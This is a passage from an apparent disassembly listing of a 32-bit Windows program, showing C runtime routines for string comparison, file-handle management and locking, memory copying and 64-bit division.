loc_415E86:                             ; CODE XREF: sub_415E1F+58↑j
                                        ; DATA XREF: .rdata:stru_422F60↓o
                push    0Eh
                call    sub_416839
                pop     ecx
                retn
sub_415E1F      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_415E90      proc near               ; CODE XREF: sub_40F7D0+10↑p
                                        ; sub_417BDA+28↓p

arg_0           = dword ptr  4
arg_4           = dword ptr  8

                mov     edx, [esp+arg_0]
                mov     ecx, [esp+arg_4]
                test    edx, 3
                jnz     short loc_415EDC

loc_415EA0:                             ; CODE XREF: sub_415E90+3C↓j
                                        ; sub_415E90+6A↓j ...
                mov     eax, [edx]
                cmp     al, [ecx]
                jnz     short loc_415ED4
                or      al, al
                jz      short loc_415ED0
                cmp     ah, [ecx+1]
                jnz     short loc_415ED4
                or      ah, ah
                jz      short loc_415ED0
                shr     eax, 10h
                cmp     al, [ecx+2]
                jnz     short loc_415ED4
                or      al, al
                jz      short loc_415ED0
                cmp     ah, [ecx+3]
                jnz     short loc_415ED4
                add     ecx, 4
                add     edx, 4
                or      ah, ah
                jnz     short loc_415EA0
                mov     edi, edi

loc_415ED0:                             ; CODE XREF: sub_415E90+18↑j
                                        ; sub_415E90+21↑j ...
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------
                align 4

loc_415ED4:                             ; CODE XREF: sub_415E90+14↑j
                                        ; sub_415E90+1D↑j ...
                sbb     eax, eax
                shl     eax, 1
                add     eax, 1
                retn
; ---------------------------------------------------------------------------

loc_415EDC:                             ; CODE XREF: sub_415E90+E↑j
                test    edx, 1
                jz      short loc_415EFC
                mov     al, [edx]
                add     edx, 1
                cmp     al, [ecx]
                jnz     short loc_415ED4
                add     ecx, 1
                or      al, al
                jz      short loc_415ED0
                test    edx, 2
                jz      short loc_415EA0

loc_415EFC:                             ; CODE XREF: sub_415E90+52↑j
                mov     ax, [edx]
                add     edx, 2
                cmp     al, [ecx]
                jnz     short loc_415ED4
                or      al, al
                jz      short loc_415ED0
                cmp     ah, [ecx+1]
                jnz     short loc_415ED4
                or      ah, ah
                jz      short loc_415ED0
                add     ecx, 2
                jmp     short loc_415EA0
sub_415E90      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_415F18      proc near               ; CODE XREF: sub_415FB4+94↓p
                                        ; sub_419E86+395↓p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                push    esi
                call    sub_416266
                pop     ecx
                cmp     eax, 0FFFFFFFFh
                jz      short loc_415F7E
                mov     eax, dword_42CA00
                cmp     esi, 1
                jnz     short loc_415F41
                test    byte ptr [eax+84h], 1
                jnz     short loc_415F4C

loc_415F41:                             ; CODE XREF: sub_415F18+1E↑j
                cmp     esi, 2
                jnz     short loc_415F62
                test    byte ptr [eax+44h], 1
                jz      short loc_415F62

loc_415F4C:                             ; CODE XREF: sub_415F18+27↑j
                push    2
                call    sub_416266
                push    1
                mov     edi, eax
                call    sub_416266
                pop     ecx
                pop     ecx
                cmp     eax, edi
                jz      short loc_415F7E

loc_415F62:                             ; CODE XREF: sub_415F18+2C↑j
                                        ; sub_415F18+32↑j
                push    esi
                call    sub_416266
                pop     ecx
                push    eax             ; hObject
                call    ds:CloseHandle
                test    eax, eax
                jnz     short loc_415F7E
                call    ds:GetLastError
                mov     edi, eax
                jmp     short loc_415F80
; ---------------------------------------------------------------------------

loc_415F7E:                             ; CODE XREF: sub_415F18+14↑j
                                        ; sub_415F18+48↑j ...
                xor     edi, edi

loc_415F80:                             ; CODE XREF: sub_415F18+64↑j
                push    esi
                call    sub_4161E0
                mov     eax, esi
                sar     eax, 5
                mov     eax, dword_42CA00[eax*4]
                and     esi, 1Fh
                shl     esi, 6
                pop     ecx
                mov     byte ptr [eax+esi+4], 0
                test    edi, edi
                jz      short loc_415FAE
                push    edi
                call    sub_410934
                pop     ecx
                or      eax, 0FFFFFFFFh
                jmp     short loc_415FB0
; ---------------------------------------------------------------------------

loc_415FAE:                             ; CODE XREF: sub_415F18+88↑j
                xor     eax, eax

loc_415FB0:                             ; CODE XREF: sub_415F18+94↑j
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_415F18      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_415FB4      proc near               ; CODE XREF: sub_40F7F0+4B↑p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    10h
                push    offset stru_422F80
                call    __SEH_prolog4
                mov     eax, [ebp+arg_0]
                cmp     eax, 0FFFFFFFEh
                jnz     short loc_415FE3
                call    sub_410921
                and     dword ptr [eax], 0
                call    sub_41090E
                mov     dword ptr [eax], 9

loc_415FDB:                             ; CODE XREF: sub_415FB4+5C↓j
                or      eax, 0FFFFFFFFh
                jmp     loc_416071
; ---------------------------------------------------------------------------

loc_415FE3:                             ; CODE XREF: sub_415FB4+12↑j
                xor     edi, edi
                cmp     eax, edi
                jl      short loc_415FF1
                cmp     eax, uNumber
                jb      short loc_416012

loc_415FF1:                             ; CODE XREF: sub_415FB4+33↑j
                                        ; sub_415FB4+7C↓j
                call    sub_410921
                mov     [eax], edi
                call    sub_41090E
                mov     dword ptr [eax], 9
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                call    sub_40EC54
                add     esp, 14h
                jmp     short loc_415FDB
; ---------------------------------------------------------------------------

loc_416012:                             ; CODE XREF: sub_415FB4+3B↑j
                mov     ecx, eax
                sar     ecx, 5
                lea     ebx, dword_42CA00[ecx*4]
                mov     esi, eax
                and     esi, 1Fh
                shl     esi, 6
                mov     ecx, [ebx]
                movsx   ecx, byte ptr [ecx+esi+4]
                and     ecx, 1
                jz      short loc_415FF1
                push    eax
                call    sub_4162DD
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi
                mov     eax, [ebx]
                test    byte ptr [eax+esi+4], 1
                jz      short loc_416053
                push    [ebp+arg_0]
                call    sub_415F18
                pop     ecx
                mov     [ebp+var_1C], eax
                jmp     short loc_416062
; ---------------------------------------------------------------------------

loc_416053:                             ; CODE XREF: sub_415FB4+8F↑j
                call    sub_41090E
                mov     dword ptr [eax], 9
                or      [ebp+var_1C], 0FFFFFFFFh

loc_416062:                             ; CODE XREF: sub_415FB4+9D↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_416077
; ---------------------------------------------------------------------------

loc_41606E:                             ; CODE XREF: sub_415FB4+CC↓j
                mov     eax, [ebp+var_1C]

loc_416071:                             ; CODE XREF: sub_415FB4+2A↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_416077:                             ; CODE XREF: sub_415FB4+B5↑j
                                        ; DATA XREF: .rdata:stru_422F80↓o
                push    [ebp+arg_0]
                call    sub_41637D
                pop     ecx
                retn
sub_415FB4      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416081      proc near               ; CODE XREF: sub_40F7F0+3F↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                mov     eax, [esi+0Ch]
                test    al, 83h
                jz      short loc_4160AF
                test    al, 8
                jz      short loc_4160AF
                push    dword ptr [esi+8] ; lpMem
                call    sub_40FD55
                and     dword ptr [esi+0Ch], 0FFFFFBF7h
                xor     eax, eax
                pop     ecx
                mov     [esi], eax
                mov     [esi+8], eax
                mov     [esi+4], eax

loc_4160AF:                             ; CODE XREF: sub_416081+E↑j
                                        ; sub_416081+12↑j
                pop     esi
                pop     ebp
                retn
sub_416081      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4160C0      proc near               ; CODE XREF: sub_40F8E3+2B↑p

arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch
arg_C           = dword ptr  10h

                push    ebx
                push    esi
                mov     eax, [esp+8+arg_C]
                or      eax, eax
                jnz     short loc_4160E2
                mov     ecx, [esp+8+arg_8]
                mov     eax, [esp+8+arg_4]
                xor     edx, edx
                div     ecx
                mov     ebx, eax
                mov     eax, [esp+8+arg_0]
                div     ecx
                mov     edx, ebx
                jmp     short loc_416123
; ---------------------------------------------------------------------------

loc_4160E2:                             ; CODE XREF: sub_4160C0+8↑j
                mov     ecx, eax
                mov     ebx, [esp+8+arg_8]
                mov     edx, [esp+8+arg_4]
                mov     eax, [esp+8+arg_0]

loc_4160F0:                             ; CODE XREF: sub_4160C0+3A↓j
                shr     ecx, 1
                rcr     ebx, 1
                shr     edx, 1
                rcr     eax, 1
                or      ecx, ecx
                jnz     short loc_4160F0
                div     ebx
                mov     esi, eax
                mul     [esp+8+arg_C]
                mov     ecx, eax
                mov     eax, [esp+8+arg_8]
                mul     esi
                add     edx, ecx
                jb      short loc_41611E
                cmp     edx, [esp+8+arg_4]
                ja      short loc_41611E
                jb      short loc_41611F
                cmp     eax, [esp+8+arg_0]
                jbe     short loc_41611F

loc_41611E:                             ; CODE XREF: sub_4160C0+4E↑j
                                        ; sub_4160C0+54↑j
                dec     esi

loc_41611F:                             ; CODE XREF: sub_4160C0+56↑j
                                        ; sub_4160C0+5C↑j
                xor     edx, edx
                mov     eax, esi

loc_416123:                             ; CODE XREF: sub_4160C0+20↑j
                pop     esi
                pop     ebx
                retn    10h
sub_4160C0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416128      proc near               ; CODE XREF: sub_41301F+B↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     dword_42AEA0, eax
                pop     ebp
                retn
sub_416128      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416137      proc near               ; CODE XREF: sub_40F94F+D↑p
                                        ; sub_40FE32+8D↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    dword_42AEA0
                call    sub_41217C
                pop     ecx
                test    eax, eax
                jz      short loc_41615B
                push    [ebp+arg_0]
                call    eax
                pop     ecx
                test    eax, eax
                jz      short loc_41615B
                xor     eax, eax
                inc     eax
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_41615B:                             ; CODE XREF: sub_416137+13↑j
                                        ; sub_416137+1D↑j
                xor     eax, eax
                pop     ebp
                retn
sub_416137      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41615F(int, HANDLE hHandle)
sub_41615F      proc near               ; CODE XREF: sub_419E86+310↓p

arg_0           = dword ptr  8
hHandle         = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    esi
                push    edi
                test    eax, eax
                jl      short loc_4161C6
                cmp     eax, uNumber
                jnb     short loc_4161C6
                mov     ecx, eax
                sar     ecx, 5
                mov     esi, eax
                and     esi, 1Fh
                lea     edi, dword_42CA00[ecx*4]
                mov     ecx, [edi]
                shl     esi, 6
                cmp     dword ptr [esi+ecx], 0FFFFFFFFh
                jnz     short loc_4161C6
                cmp     dword_425030, 1
                push    ebx
                mov     ebx, [ebp+hHandle]
                jnz     short loc_4161BC
                sub     eax, 0
                jz      short loc_4161B3
                dec     eax
                jz      short loc_4161AE
                dec     eax
                jnz     short loc_4161BC
                push    ebx
                push    0FFFFFFF4h
                jmp     short loc_4161B6
; ---------------------------------------------------------------------------

loc_4161AE:                             ; CODE XREF: sub_41615F+45↑j
                push    ebx
                push    0FFFFFFF5h
                jmp     short loc_4161B6
; ---------------------------------------------------------------------------

loc_4161B3:                             ; CODE XREF: sub_41615F+42↑j
                push    ebx             ; hHandle
                push    0FFFFFFF6h      ; nStdHandle

loc_4161B6:                             ; CODE XREF: sub_41615F+4D↑j
                                        ; sub_41615F+52↑j
                call    ds:SetStdHandle

loc_4161BC:                             ; CODE XREF: sub_41615F+3D↑j
                                        ; sub_41615F+48↑j
                mov     eax, [edi]
                mov     [esi+eax], ebx
                xor     eax, eax
                pop     ebx
                jmp     short loc_4161DC
; ---------------------------------------------------------------------------

loc_4161C6:                             ; CODE XREF: sub_41615F+C↑j
                                        ; sub_41615F+14↑j ...
                call    sub_41090E
                mov     dword ptr [eax], 9
                call    sub_410921
                and     dword ptr [eax], 0
                or      eax, 0FFFFFFFFh

loc_4161DC:                             ; CODE XREF: sub_41615F+65↑j
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_41615F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4161E0      proc near               ; CODE XREF: sub_415F18+69↑p
                                        ; sub_419E86+6F6↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                push    ebx
                xor     ebx, ebx
                cmp     ecx, ebx
                push    esi
                push    edi
                jl      short loc_41624C
                cmp     ecx, uNumber
                jnb     short loc_41624C
                mov     eax, ecx
                sar     eax, 5
                mov     esi, ecx
                lea     edi, dword_42CA00[eax*4]
                mov     eax, [edi]
                and     esi, 1Fh
                shl     esi, 6
                add     eax, esi
                test    byte ptr [eax+4], 1
                jz      short loc_41624C
                cmp     dword ptr [eax], 0FFFFFFFFh
                jz      short loc_41624C
                cmp     dword_425030, 1
                jnz     short loc_416242
                sub     ecx, ebx
                jz      short loc_416239
                dec     ecx
                jz      short loc_416234
                dec     ecx
                jnz     short loc_416242
                push    ebx
                push    0FFFFFFF4h
                jmp     short loc_41623C
; ---------------------------------------------------------------------------

loc_416234:                             ; CODE XREF: sub_4161E0+4A↑j
                push    ebx
                push    0FFFFFFF5h
                jmp     short loc_41623C
; ---------------------------------------------------------------------------

loc_416239:                             ; CODE XREF: sub_4161E0+47↑j
                push    ebx             ; hHandle
                push    0FFFFFFF6h      ; nStdHandle

loc_41623C:                             ; CODE XREF: sub_4161E0+52↑j
                                        ; sub_4161E0+57↑j
                call    ds:SetStdHandle

loc_416242:                             ; CODE XREF: sub_4161E0+43↑j
                                        ; sub_4161E0+4D↑j
                mov     eax, [edi]
                or      dword ptr [esi+eax], 0FFFFFFFFh
                xor     eax, eax
                jmp     short loc_416261
; ---------------------------------------------------------------------------

loc_41624C:                             ; CODE XREF: sub_4161E0+F↑j
                                        ; sub_4161E0+17↑j ...
                call    sub_41090E
                mov     dword ptr [eax], 9
                call    sub_410921
                mov     [eax], ebx
                or      eax, 0FFFFFFFFh

loc_416261:                             ; CODE XREF: sub_4161E0+6A↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_4161E0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416266      proc near               ; CODE XREF: sub_4154AB+A↑p
                                        ; sub_415F18+B↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                cmp     eax, 0FFFFFFFEh
                jnz     short loc_41628B
                call    sub_410921
                and     dword ptr [eax], 0
                call    sub_41090E
                mov     dword ptr [eax], 9
                or      eax, 0FFFFFFFFh
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_41628B:                             ; CODE XREF: sub_416266+B↑j
                push    esi
                xor     esi, esi
                cmp     eax, esi
                jl      short loc_4162B4
                cmp     eax, uNumber
                jnb     short loc_4162B4
                mov     ecx, eax
                and     eax, 1Fh
                sar     ecx, 5
                mov     ecx, dword_42CA00[ecx*4]
                shl     eax, 6
                add     eax, ecx
                test    byte ptr [eax+4], 1
                jnz     short loc_4162D8

loc_4162B4:                             ; CODE XREF: sub_416266+2A↑j
                                        ; sub_416266+32↑j
                call    sub_410921
                mov     [eax], esi
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 9
                call    sub_40EC54
                add     esp, 14h
                or      eax, 0FFFFFFFFh
                jmp     short loc_4162DA
; ---------------------------------------------------------------------------

loc_4162D8:                             ; CODE XREF: sub_416266+4C↑j
                mov     eax, [eax]

loc_4162DA:                             ; CODE XREF: sub_416266+70↑j
                pop     esi
                pop     ebp
                retn
sub_416266      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4162DD      proc near               ; CODE XREF: sub_414448+A0↑p
                                        ; sub_414FE8+7F↑p ...

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    0Ch
                push    offset stru_422FA0
                call    __SEH_prolog4
                mov     edi, [ebp+arg_0]
                mov     eax, edi
                sar     eax, 5
                mov     esi, edi
                and     esi, 1Fh
                shl     esi, 6
                add     esi, dword_42CA00[eax*4]
                mov     [ebp+var_1C], 1
                xor     ebx, ebx
                cmp     [esi+8], ebx
                jnz     short loc_416344
                push    0Ah
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], ebx
                cmp     [esi+8], ebx
                jnz     short loc_416338
                push    0FA0h           ; dwSpinCount
                lea     eax, [esi+0Ch]
                push    eax             ; lpCriticalSection
                call    sub_419CA1
                pop     ecx
                pop     ecx
                test    eax, eax
                jnz     short loc_416335
                mov     [ebp+var_1C], ebx

loc_416335:                             ; CODE XREF: sub_4162DD+53↑j
                inc     dword ptr [esi+8]

loc_416338:                             ; CODE XREF: sub_4162DD+3F↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_416374
; ---------------------------------------------------------------------------

loc_416344:                             ; CODE XREF: sub_4162DD+2F↑j
                                        ; sub_4162DD+9F↓j
                cmp     [ebp+var_1C], ebx
                jz      short loc_416366
                mov     eax, edi
                sar     eax, 5
                and     edi, 1Fh
                shl     edi, 6
                mov     eax, dword_42CA00[eax*4]
                lea     eax, [eax+edi+0Ch]
                push    eax             ; lpCriticalSection
                call    ds:EnterCriticalSection

loc_416366:                             ; CODE XREF: sub_4162DD+6A↑j
                mov     eax, [ebp+var_1C]
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_41636F:                             ; DATA XREF: .rdata:stru_422FA0↓o
                xor     ebx, ebx
                mov     edi, [ebp+arg_0]

loc_416374:                             ; CODE XREF: sub_4162DD+62↑j
                push    0Ah
                call    sub_416839
                pop     ecx
                retn
sub_4162DD      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41637D      proc near               ; CODE XREF: sub_414448+F6↑p
                                        ; sub_414FE8+D5↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, eax
                and     eax, 1Fh
                sar     ecx, 5
                mov     ecx, dword_42CA00[ecx*4]
                shl     eax, 6
                lea     eax, [ecx+eax+0Ch]
                push    eax             ; lpCriticalSection
                call    ds:LeaveCriticalSection
                pop     ebp
                retn
sub_41637D      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4163A4      proc near               ; CODE XREF: sub_419E86:loc_41A06C↓p

var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h

                push    18h
                push    offset stru_422FC0
                call    __SEH_prolog4
                or      [ebp+var_1C], 0FFFFFFFFh
                xor     edi, edi
                mov     [ebp+var_24], edi
                push    0Bh
                call    sub_416850
                pop     ecx
                test    eax, eax
                jnz     short loc_4163CD
                or      eax, 0FFFFFFFFh
                jmp     loc_41652F
; ---------------------------------------------------------------------------

loc_4163CD:                             ; CODE XREF: sub_4163A4+1F↑j
                push    0Bh
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi

loc_4163D8:                             ; CODE XREF: sub_4163A4+104↓j
                mov     [ebp+var_28], edi
                cmp     edi, 40h
                jge     loc_416520
                mov     esi, dword_42CA00[edi*4]
                test    esi, esi
                jz      loc_4164AD

loc_4163F3:                             ; CODE XREF: sub_4163A4+CB↓j
                mov     [ebp+var_20], esi
                mov     eax, dword_42CA00[edi*4]
                add     eax, 800h
                cmp     esi, eax
                jnb     loc_4164A1
                test    byte ptr [esi+4], 1
                jnz     short loc_41646C
                cmp     dword ptr [esi+8], 0
                jnz     short loc_41644F
                push    0Ah
                call    sub_416913
                pop     ecx
                xor     ebx, ebx
                inc     ebx
                mov     [ebp+ms_exc.registration.TryLevel], ebx
                cmp     dword ptr [esi+8], 0
                jnz     short loc_416446
                push    0FA0h           ; dwSpinCount
                lea     eax, [esi+0Ch]
                push    eax             ; lpCriticalSection
                call    sub_419CA1
                pop     ecx
                pop     ecx
                test    eax, eax
                jnz     short loc_416443
                mov     [ebp+var_24], ebx
                jmp     short loc_416446
; ---------------------------------------------------------------------------

loc_416443:                             ; CODE XREF: sub_4163A4+98↑j
                inc     dword ptr [esi+8]

loc_416446:                             ; CODE XREF: sub_4163A4+84↑j
                                        ; sub_4163A4+9D↑j
                and     [ebp+ms_exc.registration.TryLevel], 0
                call    loc_416477
; ---------------------------------------------------------------------------

loc_41644F:                             ; CODE XREF: sub_4163A4+70↑j
                                        ; sub_4163A4+DB↓j
                cmp     [ebp+var_24], 0
                jnz     short loc_41646C
                lea     ebx, [esi+0Ch]
                push    ebx             ; lpCriticalSection
                call    ds:EnterCriticalSection
                test    byte ptr [esi+4], 1
                jz      short loc_416480
                push    ebx             ; lpCriticalSection
                call    ds:LeaveCriticalSection

loc_41646C:                             ; CODE XREF: sub_4163A4+6A↑j
                                        ; sub_4163A4+AF↑j ...
                add     esi, 40h
                jmp     short loc_4163F3
; ---------------------------------------------------------------------------

loc_416471:                             ; DATA XREF: .rdata:stru_422FC0↓o
                mov     edi, [ebp+var_28]
                mov     esi, [ebp+var_20]

loc_416477:                             ; CODE XREF: sub_4163A4+A6↑j
                push    0Ah
                call    sub_416839
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_416480:                             ; CODE XREF: sub_4163A4+BF↑j
                cmp     [ebp+var_24], 0
                jnz     short loc_41646C
                mov     byte ptr [esi+4], 1
                or      dword ptr [esi], 0FFFFFFFFh
                sub     esi, dword_42CA00[edi*4]
                sar     esi, 6
                mov     eax, edi
                shl     eax, 5
                add     esi, eax
                mov     [ebp+var_1C], esi

loc_4164A1:                             ; CODE XREF: sub_4163A4+60↑j
                cmp     [ebp+var_1C], 0FFFFFFFFh
                jnz     short loc_416520
                inc     edi
                jmp     loc_4163D8
; ---------------------------------------------------------------------------

loc_4164AD:                             ; CODE XREF: sub_4163A4+49↑j
                push    40h
                push    20h
                call    sub_412BF8
                pop     ecx
                pop     ecx
                mov     [ebp+var_20], eax
                test    eax, eax
                jz      short loc_416520
                lea     ecx, dword_42CA00[edi*4]
                mov     [ecx], eax
                add     uNumber, 20h

loc_4164CF:                             ; CODE XREF: sub_4163A4+14C↓j
                mov     edx, [ecx]
                add     edx, 800h
                cmp     eax, edx
                jnb     short loc_4164F2
                mov     byte ptr [eax+4], 0
                or      dword ptr [eax], 0FFFFFFFFh
                mov     byte ptr [eax+5], 0Ah
                and     dword ptr [eax+8], 0
                add     eax, 40h
                mov     [ebp+var_20], eax
                jmp     short loc_4164CF
; ---------------------------------------------------------------------------

loc_4164F2:                             ; CODE XREF: sub_4163A4+135↑j
                shl     edi, 5
                mov     [ebp+var_1C], edi
                mov     eax, edi
                sar     eax, 5
                mov     ecx, edi
                and     ecx, 1Fh
                shl     ecx, 6
                mov     eax, dword_42CA00[eax*4]
                mov     byte ptr [eax+ecx+4], 1
                push    edi
                call    sub_4162DD
                pop     ecx
                test    eax, eax
                jnz     short loc_416520
                or      [ebp+var_1C], 0FFFFFFFFh

loc_416520:                             ; CODE XREF: sub_4163A4+3A↑j
                                        ; sub_4163A4+101↑j ...
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_416535
; ---------------------------------------------------------------------------

loc_41652C:                             ; CODE XREF: sub_4163A4+199↓j
                mov     eax, [ebp+var_1C]

loc_41652F:                             ; CODE XREF: sub_4163A4+24↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_416535:                             ; CODE XREF: sub_4163A4+183↑j
                                        ; DATA XREF: .rdata:stru_422FC0↓o
                push    0Bh
                call    sub_416839
                pop     ecx
                retn
sub_4163A4      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41653E      proc near               ; CODE XREF: sub_4165C5+4D↓p

var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                sub     esp, 8
                mov     [ebp+var_4], edi
                mov     [ebp+var_8], esi
                mov     esi, [ebp+arg_4]
                mov     edi, [ebp+arg_0]
                mov     ecx, [ebp+arg_8]
                shr     ecx, 7
                jmp     short loc_41655E
; ---------------------------------------------------------------------------
                db 8Dh, 9Bh, 4 dup(0)
; ---------------------------------------------------------------------------

loc_41655E:                             ; CODE XREF: sub_41653E+18↑j
                                        ; sub_41653E+7B↓j
                movdqa  xmm0, xmmword ptr [esi]
                movdqa  xmm1, xmmword ptr [esi+10h]
                movdqa  xmm2, xmmword ptr [esi+20h]
                movdqa  xmm3, xmmword ptr [esi+30h]
                movdqa  xmmword ptr [edi], xmm0
                movdqa  xmmword ptr [edi+10h], xmm1
                movdqa  xmmword ptr [edi+20h], xmm2
                movdqa  xmmword ptr [edi+30h], xmm3
                movdqa  xmm4, xmmword ptr [esi+40h]
                movdqa  xmm5, xmmword ptr [esi+50h]
                movdqa  xmm6, xmmword ptr [esi+60h]
                movdqa  xmm7, xmmword ptr [esi+70h]
                movdqa  xmmword ptr [edi+40h], xmm4
                movdqa  xmmword ptr [edi+50h], xmm5
                movdqa  xmmword ptr [edi+60h], xmm6
                movdqa  xmmword ptr [edi+70h], xmm7
                lea     esi, [esi+80h]
                lea     edi, [edi+80h]
                dec     ecx
                jnz     short loc_41655E
                mov     esi, [ebp+var_8]
                mov     edi, [ebp+var_4]
                mov     esp, ebp
                pop     ebp
                retn
sub_41653E      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4165C5      proc near               ; CODE XREF: sub_40F9F0+42↑j
                                        ; sub_414550+42↑j ...

var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                sub     esp, 1Ch
                mov     [ebp+var_C], edi
                mov     [ebp+var_8], esi
                mov     [ebp+var_4], ebx
                mov     ebx, [ebp+arg_4]
                mov     eax, ebx
                cdq
                mov     ecx, eax
                mov     eax, [ebp+arg_0]
                xor     ecx, edx
                sub     ecx, edx
                and     ecx, 0Fh
                xor     ecx, edx
                sub     ecx, edx
                cdq
                mov     edi, eax
                xor     edi, edx
                sub     edi, edx
                and     edi, 0Fh
                xor     edi, edx
                sub     edi, edx
                mov     edx, ecx
                or      edx, edi
                jnz     short loc_416648
                mov     esi, [ebp+arg_8]
                mov     ecx, esi
                and     ecx, 7Fh
                mov     [ebp+var_18], ecx
                cmp     esi, ecx
                jz      short loc_416620
                sub     esi, ecx
                push    esi
                push    ebx
                push    eax
                call    sub_41653E
                add     esp, 0Ch
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+var_18]

loc_416620:                             ; CODE XREF: sub_4165C5+46↑j
                test    ecx, ecx
                jz      short loc_41669B
                mov     ebx, [ebp+arg_8]
                mov     edx, [ebp+arg_4]
                add     edx, ebx
                sub     edx, ecx
                mov     [ebp+var_14], edx
                add     ebx, eax
                sub     ebx, ecx
                mov     [ebp+var_10], ebx
                mov     esi, [ebp+var_14]
                mov     edi, [ebp+var_10]
                mov     ecx, [ebp+var_18]
                rep movsb
                mov     eax, [ebp+arg_0]
                jmp     short loc_41669B
; ---------------------------------------------------------------------------

loc_416648:                             ; CODE XREF: sub_4165C5+37↑j
                cmp     ecx, edi
                jnz     short loc_416681
                neg     ecx
                add     ecx, 10h
                mov     [ebp+var_1C], ecx
                mov     esi, [ebp+arg_4]
                mov     edi, [ebp+arg_0]
                mov     ecx, [ebp+var_1C]
                rep movsb
                mov     ecx, [ebp+arg_0]
                add     ecx, [ebp+var_1C]
                mov     edx, [ebp+arg_4]
                add     edx, [ebp+var_1C]
                mov     eax, [ebp+arg_8]
                sub     eax, [ebp+var_1C]
                push    eax
                push    edx
                push    ecx
                call    sub_4165C5
                add     esp, 0Ch
                mov     eax, [ebp+arg_0]
                jmp     short loc_41669B
; ---------------------------------------------------------------------------

loc_416681:                             ; CODE XREF: sub_4165C5+85↑j
                mov     esi, [ebp+arg_4]
                mov     edi, [ebp+arg_0]
                mov     ecx, [ebp+arg_8]
                mov     edx, ecx
                shr     ecx, 2
                rep movsd
                mov     ecx, edx
                and     ecx, 3
                rep movsb
                mov     eax, [ebp+arg_0]

loc_41669B:                             ; CODE XREF: sub_4165C5+5D↑j
                                        ; sub_4165C5+81↑j ...
                mov     ebx, [ebp+var_4]
                mov     esi, [ebp+var_8]
                mov     edi, [ebp+var_C]
                mov     esp, ebp
                pop     ebp
                retn
sub_4165C5      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4166A8      proc near               ; CODE XREF: sub_4166F8+4F↓p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h

                push    0Ch
                push    offset stru_422FE8
                call    __SEH_prolog4
                and     [ebp+ms_exc.registration.TryLevel], 0
                movapd  xmm0, xmm1
                mov     [ebp+var_1C], 1
                jmp     short loc_4166E8
; ---------------------------------------------------------------------------

